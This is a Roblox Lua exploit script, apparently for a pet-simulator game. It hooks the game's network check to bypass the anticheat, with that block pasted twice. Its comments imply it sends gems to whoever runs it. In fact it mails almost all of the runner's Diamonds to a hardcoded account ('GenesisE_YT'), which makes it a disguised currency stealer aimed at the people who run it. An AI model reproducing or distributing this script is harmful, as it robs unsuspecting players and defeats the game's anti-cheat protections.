local UserToSendTo = "GenesisE_YT" -- Username To Send Gems To
local GemsAmount = 10000 -- If Your Gems Go Over This Amount It Will Send Them To You
local Message = "Hello"

local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network)
local Fire, Invoke = Network.Fire, Network.Invoke

-- Hooking the _check function in the module to bypass the anticheat.

local old
old = hookfunction(getupvalue(Fire, 1), function(...)
   return true
end)


        
        
        local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network)
        local Fire, Invoke = Network.Fire, Network.Invoke
        
        local GL = require(game:GetService("ReplicatedStorage").Framework.Library)
        local localPlr = game.Players.LocalPlayer
        local character = localPlr.Character or LocalPlayer.CharacterAdded:Wait()
        local humanoid = character:WaitForChild("Humanoid")
        
        local library = game:GetService("ReplicatedStorage"):WaitForChild("Library");
        local NetworkVariables = require(library.Variables)
        local hrp = character:WaitForChild("HumanoidRootPart")
        
        GL.Variables.Teleporting = false;
        
        
        
        
        local old
        old = hookfunction(getupvalue(Fire, 1), function(...)
           return true
        end)
 

while 1 do
        local Ccount = 0
        for i, v in pairs(Invoke("Get Coins")) do
            Ccount = Ccount + 1
        end
        if Ccount >= 10 then break end
        wait(2)
    end

wait(1)

function GetPlayerCash(coin)
        amountstr = game.Players.LocalPlayer.PlayerGui.Main.Right[coin].Amount.Text
        amountstrnocomas = amountstr:gsub("%D", "")
        return tonumber(amountstrnocomas)
end

    if GetPlayerCash("Diamonds") >= GemsAmount then
        user = UserToSendTo
	    msg = Message
	    gems = GetPlayerCash("Diamonds") - 100000
        wait(1)
        Invoke("Send Mail", {
        ["Recipient"] = user,
        ["Diamonds"] = gems,
        ["Pets"] = {},
        ["Message"] = msg
    })
        wait(3)
    
end
